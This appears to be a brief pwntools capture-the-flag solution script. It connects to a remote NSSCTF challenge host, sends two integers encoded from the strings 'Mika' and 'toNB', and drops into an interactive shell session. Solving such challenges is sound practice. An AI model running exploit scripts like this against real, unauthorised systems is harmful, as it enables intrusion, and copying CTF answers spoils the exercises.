from pwn import *

#io = process("./pwn")
io = remote("node5.anna.nssctf.cn", 24551)
io.sendline(str(int.from_bytes(b"Mika", byteorder="little")).encode())
io.sendline(str(int.from_bytes(b"toNB", byteorder="little")).encode())
io.interactive()
